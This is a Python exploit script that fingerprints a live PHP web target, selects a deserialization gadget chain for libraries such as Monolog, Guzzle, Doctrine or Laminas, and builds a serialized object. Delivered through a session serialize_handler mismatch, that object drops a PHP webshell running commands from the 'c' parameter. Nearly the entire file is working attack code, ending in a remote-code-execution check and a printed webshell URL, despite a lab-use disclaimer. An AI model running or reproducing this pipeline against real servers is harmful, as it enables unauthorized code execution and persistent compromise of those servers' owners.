#!/usr/bin/env python3
# INDEX: fingerprint target and select pop gadget | fpm apache | session serialize_handler mismatch configured
"""Auto-source a destructor POP gadget from a target fingerprint.

Removes the hand-pick step for the session serialize_handler-mismatch route: it
(a) fingerprints a live target, (b) maps the fingerprint to an available POP
chain, and (c) emits the serialized gadget for session_handler_mismatch.py to
deliver.

Fingerprint signals (highest-confidence first):
  * exposed composer.lock / composer.json -> package names + versions
  * response/banner signatures in the body (framework or lab-app markers)
  * headers / cookies (laravel_session, X-Debug-Token, ...)
Chain selection prefers __destruct file-write chains (fire on a bare
unserialize), gated by the phpggc-declared version range.

Chain emission:
  * builtin: self-contained serialized templates (no external tool)
  * phpggc: generated via gadget_phpggc.gen_phpggc (needs a phpggc checkout)

Scope: an APPLICATION-LEVEL object injection, not a PHP-core memory-corruption
bug (not in the CVE-2026-109618/109619 family). Conditional on non-default gates
(handler mismatch + an app-reachable __destruct gadget). Pure stdlib; python3 -I
safe. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
from urllib.parse import urlsplit

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT, os.path.join(_POC_ROOT, "routes")):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import session_handler_mismatch as shm   # noqa: E402  (its delivery route, in routes/)
import gadget_phpggc as gp               # noqa: E402

DEFAULT_SHELL = b"<?php system($_GET['c']); ?>"

# Candidate endpoints probed when the operator does not pin --writer/--reader.
WRITER_CANDIDATES = ["/index.php", "/"]
READER_CANDIDATES = ["/legacy.php", "/reader.php", "/index.php"]


# Chain registry: fingerprint -> POP chain.
#
# Each entry declares how to recognise a framework/app and which chain to use.
# `kind`:
#   "builtin" -> a serialized template in BUILTIN_TEMPLATES (no external tool)
#   "phpggc"  -> `preset` generated through gadget_phpggc (file-write, __destruct)
# `vmatch` is a predicate on the detected version string; None = accept any.
# Only __destruct (or __toString that the reader forces) chains are listed, so
# the object fires on a bare session unserialize.
def _semver_major(v):
    m = re.search(r"(\d+)", v or "")
    return int(m.group(1)) if m else None


def _ge(lo):
    def f(v):
        maj = _semver_major(v)
        return maj is not None and maj >= lo
    return f


def _in_major(los):
    def f(v):
        maj = _semver_major(v)
        return maj in los
    return f


# package-name (composer) -> candidate chains, best first.
COMPOSER_MAP = {
    "monolog/monolog": [
        {"kind": "builtin", "template": "monolog_fw1", "preset": "Monolog/FW1",
         "vmatch": _ge(3), "note": "monolog 3.x DeduplicationHandler file-write"},
    ],
    "guzzlehttp/guzzle": [
        {"kind": "phpggc", "preset": "Guzzle/FW1",
         "vmatch": _in_major([4, 5, 6, 7]),
         "note": "Guzzle 4..7.5 FnStream file-write"},
    ],
    "doctrine/orm": [
        {"kind": "phpggc", "preset": "Doctrine/FW2", "vmatch": _in_major([2]),
         "note": "Doctrine 2.3..2.8.5 file-write"},
    ],
    "doctrine/collections": [
        {"kind": "phpggc", "preset": "Doctrine/FW2", "vmatch": _in_major([2]),
         "note": "Doctrine collections proxy for Doctrine/FW2"},
    ],
    "laminas/laminas-http": [
        {"kind": "phpggc", "preset": "Laminas/FW1", "vmatch": None,
         "note": "Laminas 2.8..3.0 file-write"},
    ],
}

# body / header signatures -> a chain (for apps that do not expose composer.lock).
# `test` gets (status, body, headers_lower_dict) and returns a version-ish str or
# True on match, or None/False otherwise.
def _sig_shmismatch(status, body, hdrs):
    return "shmismatch-lab" in body

def _sig_pggc(status, body, hdrs):
    return "pggc-lab" in body

def _sig_gfp(status, body, hdrs):
    return "gfp-lab" in body


SIGNATURE_MAP = [
    # The shmismatch lab exposes a private DeferredWriter __destruct gadget; it
    # has no composer footprint, so it is recognised by its app banner. This is
    # the "known app -> known gadget surface" case.
    {"name": "shmismatch-lab (DeferredWriter)", "test": _sig_shmismatch,
     "chain": {"kind": "builtin", "template": "deferredwriter",
               "preset": None, "note": "private app DeferredWriter{path,data}"}},
    {"name": "pggc-lab (Monolog)", "test": _sig_pggc,
     "chain": {"kind": "builtin", "template": "monolog_fw1",
               "preset": "Monolog/FW1", "note": "Monolog file-write"}},
    {"name": "gfp-lab (Monolog)", "test": _sig_gfp,
     "chain": {"kind": "builtin", "template": "monolog_fw1",
               "preset": "Monolog/FW1", "note": "Monolog file-write"}},
]


# Builtin serialized templates (self-contained; no external tool).
# Each builder takes (shell_path, shell_body) -> serialized object bytes.
def _b(s):
    return s.encode() if isinstance(s, str) else s


def build_deferredwriter(shell_path, shell_body):
    """Private-app gadget: DeferredWriter{public $path,$data}; __destruct writes
    $data to $path. Mirrors shm.build_object."""
    return shm.build_object("DeferredWriter", shell_path, shell_body)


def build_monolog_fw1(shell_path, shell_body):
    """Monolog 3.x file-write (GroupHandler -> DeduplicationHandler __destruct).
    Byte-for-byte the structure phpggc's Monolog/FW1 emits; the record message
    carries the dropped content (Monolog appends a trailing space, harmless for
    a PHP tag). The deduplicationStore path is the drop target."""
    p = _b(shell_path)
    # Monolog appends a trailing space to the record message on flush; the body
    # lands as the message. Protected-property names carry the real \x00*\x00
    # marker (NOT literal spaces). Structure/field-order mirror phpggc's
    # Monolog/FW1 exactly so the r:8 back-reference (deduplicationLevel -> the
    # LogRecord level enum) stays valid.
    nul = b"\x00*\x00"
    msg = _b(shell_body) + b" "
    return (
        b'O:28:"Monolog\\Handler\\GroupHandler":1:{s:11:"' + nul + b'handlers";a:1:{i:0;'
        b'O:36:"Monolog\\Handler\\DeduplicationHandler":4:'
        b'{s:21:"' + nul + b'deduplicationStore";s:%d:"%s";'
        b's:13:"' % (len(p), p) + nul + b'bufferSize";i:1;'
        b's:9:"' + nul + b'buffer";a:1:{i:0;'
        b'O:17:"Monolog\\LogRecord":3:{'
        b's:5:"level";E:19:"Monolog\\Level:Debug";'
        b's:7:"message";s:%d:"%s";'
        b's:8:"datetime";O:17:"DateTimeImmutable":3:'
        b'{s:4:"date";s:26:"2026-10-24 01:37:10.436370";'
        b's:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}}'
        b's:21:"' % (len(msg), msg) + nul + b'deduplicationLevel";r:8;}}}'
    )


BUILTIN_TEMPLATES = {
    "deferredwriter": build_deferredwriter,
    "monolog_fw1": build_monolog_fw1,
}


# Fingerprinting
def _get(host, port, path, timeout=10.0):
    """GET path; return (status, body_str, headers_lower_dict). Best-effort."""
    try:
        st, body, _ = shm.http_get(host, port, path, timeout=timeout)
    except OSError:
        return "", "", {}
    text = body.decode("latin1", "replace")
    hdrs = {}
    # shm.http_get only returns status + body; re-read headers cheaply here.
    return st, text, hdrs


def _get_with_headers(host, port, path, timeout=10.0):
    """Full GET returning (status_line, body_bytes, header_text)."""
    import socket
    h = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Connection: close\r\n\r\n")
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(h.encode())
            buf = shm._recv_all(s, timeout)
    except OSError:
        return "", b"", ""
    head, _, rest = buf.partition(b"\r\n\r\n")
    if b"chunked" in head.lower():
        rest = shm._dechunk(rest)
    status = head.split(b"\r\n")[0].decode("latin1", "replace") if head else ""
    return status, rest, head.decode("latin1", "replace")


def _parse_composer(body_bytes):
    """Return {package: version} from composer.lock or composer.json bytes."""
    out = {}
    try:
        doc = json.loads(body_bytes.decode("utf-8", "replace"))
    except (ValueError, AttributeError):
        return out
    if isinstance(doc, dict) and "packages" in doc:          # composer.lock
        for grp in ("packages", "packages-dev"):
            for pkg in doc.get(grp, []) or []:
                if isinstance(pkg, dict) and "name" in pkg:
                    out[pkg["name"].lower()] = str(pkg.get("version", "?"))
    elif isinstance(doc, dict):                              # composer.json
        for grp in ("require", "require-dev"):
            for name, ver in (doc.get(grp, {}) or {}).items():
                out[name.lower()] = str(ver)
    return out


def fingerprint(host, port, log, timeout=10.0):
    """Collect signals from the live target. Returns a dict."""
    fp = {"packages": {}, "signatures": [], "banner": "", "headers": "",
          "sources": []}

    # 1) exposed composer.lock / composer.json (strongest signal).
    for path in ("/composer.lock", "/composer.json"):
        st, body, _ = _get_with_headers(host, port, path, timeout)
        if st and " 200 " in st and body.strip():
            pkgs = _parse_composer(body)
            if pkgs:
                fp["packages"].update(pkgs)
                fp["sources"].append(path)
                log(f"[fp] {path}: {len(pkgs)} packages exposed")

    # 2) landing-page banner + headers (body/response signatures, cookies).
    st, body, head = _get_with_headers(host, port, "/", timeout)
    btext = body.decode("latin1", "replace")
    fp["banner"] = btext[:200]
    fp["headers"] = head
    hl = head.lower()
    for sig in SIGNATURE_MAP:
        try:
            if sig["test"](st, btext, hl):
                fp["signatures"].append(sig["name"])
        except Exception:
            pass
    # generic framework hints (reported, mapped where a chain exists)
    if "laravel_session" in hl or "x-laravel" in hl:
        fp["signatures"].append("laravel (cookie/header)")
    if "x-debug-token" in hl or "symfony" in hl:
        fp["signatures"].append("symfony (profiler/header)")
    if re.search(r'name="generator" content="WordPress', btext, re.I):
        fp["signatures"].append("wordpress (generator meta)")

    if not fp["packages"] and not fp["signatures"]:
        log("[fp] no framework signal (no exposed composer file, no known "
            "banner/header). Fingerprint is empty.")
    return fp


def select_chain(fp, log):
    """Map a fingerprint to one POP chain. Returns a selection dict or None.
    Selection dict: {framework, version, kind, template, preset, note, source,
    confidence}."""
    # a) composer package match (version-gated -> higher confidence).
    for pkg, ver in fp.get("packages", {}).items():
        for cand in COMPOSER_MAP.get(pkg, []):
            vmatch = cand.get("vmatch")
            if vmatch is None or vmatch(ver):
                sel = dict(cand)
                sel.update({"framework": pkg, "version": ver,
                            "source": "composer", "confidence": "high"})
                log(f"[sel] composer {pkg} {ver} -> {sel.get('preset') or sel['template']} "
                    f"({sel['note']})")
                return sel
            else:
                log(f"[sel] composer {pkg} {ver} present but version outside "
                    f"{cand.get('preset') or cand['template']} range -> skip")

    # b) banner/response signature match.
    btext = fp.get("banner", "")
    hl = fp.get("headers", "").lower()
    for sig in SIGNATURE_MAP:
        try:
            if sig["test"]("", btext, hl):
                c = sig["chain"]
                sel = dict(c)
                sel.update({"framework": sig["name"], "version": "n/a",
                            "source": "signature", "confidence": "medium"})
                log(f"[sel] signature {sig['name']} -> "
                    f"{sel.get('preset') or sel['template']} ({sel['note']})")
                return sel
        except Exception:
            pass

    log("[sel] no chain could be selected from the fingerprint.")
    return None


def emit_gadget(sel, shell_path, shell_body, phpggc_dir=None,
                local_php=False, log=print):
    """Produce the serialized object bytes for a selection. Returns bytes|None.
    Prefers a builtin template; falls back to phpggc for `kind==phpggc`."""
    if sel.get("kind") == "builtin":
        builder = BUILTIN_TEMPLATES.get(sel["template"])
        if builder:
            obj = builder(shell_path, shell_body)
            log(f"[gen] builtin {sel['template']}: {len(obj)} bytes")
            return obj
        log(f"[gen] no builtin template {sel['template']!r}")
    # phpggc path (or builtin missing)
    preset = sel.get("preset")
    if preset and phpggc_dir:
        obj = gp.gen_phpggc(preset, shell_path, shell_body, phpggc_dir,
                            local_php=local_php)
        if obj:
            log(f"[gen] phpggc {preset}: {len(obj)} bytes")
            return obj
        log(f"[gen] phpggc could not build {preset} (check --phpggc checkout)")
    elif preset:
        log(f"[gen] {preset} needs phpggc; pass --phpggc <checkout>")
    return None


def discover_endpoints(host, port, writer, reader, log, timeout=8.0):
    """Resolve writer/reader endpoints if not pinned. Returns (writer, reader)."""
    if writer is None:
        writer = "/index.php"
        for c in WRITER_CANDIDATES:
            st, _, _ = _get_with_headers(host, port, c, timeout)
            if st and (" 200 " in st or " 302 " in st):
                writer = c if c != "/" else "/index.php"
                break
    if reader is None:
        reader = None
        for c in READER_CANDIDATES:
            st, _, _ = _get_with_headers(host, port, c, timeout)
            if st and " 200 " in st:
                reader = c
                break
        if reader is None:
            reader = "/legacy.php"
    log(f"[ep] writer={writer} reader={reader}")
    return writer, reader


def run(host, port, writer=None, reader=None, shell_name="p2s_gfp_shell.php",
        docroot="/var/www/html", cmd="id", sid=None, race=False,
        phpggc_dir=None, local_php=False, shell_body=DEFAULT_SHELL,
        max_tries=40, file_mb=4, dry_run=False, verbose=True):
    """Full pipeline: fingerprint -> select -> emit -> deliver -> confirm.
    Returns (ok, uid_line, selection)."""
    def log(m):
        if verbose:
            print(m, flush=True)

    log(f"[*] fingerprinting {host}:{port}")
    fp = fingerprint(host, port, log)
    sel = select_chain(fp, log)
    if not sel:
        log("[-] no gadget chain selected; target not covered by the registry.")
        return False, None, None

    shell_path = f"{docroot.rstrip('/')}/{shell_name}"
    obj = emit_gadget(sel, shell_path, shell_body, phpggc_dir=phpggc_dir,
                      local_php=local_php, log=log)
    if not obj:
        log("[-] could not emit the serialized gadget.")
        return False, None, sel
    log(f"[+] selected {sel.get('preset') or sel['template']} "
        f"(source={sel['source']}, confidence={sel['confidence']})")
    if dry_run:
        log("[dry-run] gadget object:")
        log("    " + obj[:160].decode("latin1", "replace"))
        return True, None, sel

    writer, reader = discover_endpoints(host, port, writer, reader, log)
    runner = shm.run_race if race else shm.run_base
    kw = {"max_tries": max_tries, "file_mb": file_mb} if race else {}
    hit = runner(host, port, writer, reader, shell_name, shell_path,
                 obj, cmd, sid, log, **kw)
    return (hit is not None), hit, sel


def main(argv):
    ap = argparse.ArgumentParser(
        description="Auto-fingerprint a target and auto-select a destructor "
                    "gadget for the session serialize_handler-mismatch route.")
    ap.add_argument("url", help="base URL, e.g. http://127.0.0.1:8135")
    ap.add_argument("--writer", default=None, help="writer endpoint (auto if unset)")
    ap.add_argument("--reader", default=None, help="mismatch reader (auto if unset)")
    ap.add_argument("--shell-name", default="p2s_gfp_shell.php")
    ap.add_argument("--docroot", default="/var/www/html")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--race", action="store_true",
                    help="race variant (cleanup=On/stock targets)")
    ap.add_argument("--phpggc", default=None,
                    help="phpggc checkout (needed for phpggc-kind chains)")
    ap.add_argument("--local-php", action="store_true",
                    help="run phpggc with local php instead of docker")
    ap.add_argument("--dry-run", action="store_true",
                    help="fingerprint + select + emit, print the object, do not deliver")
    ap.add_argument("--max-tries", type=int, default=40)
    ap.add_argument("--file-mb", type=int, default=4)
    args = ap.parse_args(argv)

    u = urlsplit(args.url)
    if u.scheme not in ("http", ""):
        raise SystemExit(f"only http:// targets supported, got {u.scheme!r}")
    host = u.hostname or "127.0.0.1"
    port = u.port or 80

    ok, hit, sel = run(host, port, writer=args.writer, reader=args.reader,
                       shell_name=args.shell_name, docroot=args.docroot,
                       cmd=args.cmd, sid=args.sid, race=args.race,
                       phpggc_dir=args.phpggc, local_php=args.local_php,
                       dry_run=args.dry_run, max_tries=args.max_tries,
                       file_mb=args.file_mb)
    if args.dry_run:
        return 0 if ok else 1
    if ok:
        print(f"[+] RCE landed via auto-selected "
              f"{sel.get('preset') or sel['template']}: {(hit or '').strip()}")
        print(f"[+] webshell: http://{host}:{port}/{args.shell_name}?c=<cmd>")
        return 0
    print("[-] no RCE (fingerprint miss, uncovered target, or a gate is unmet)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
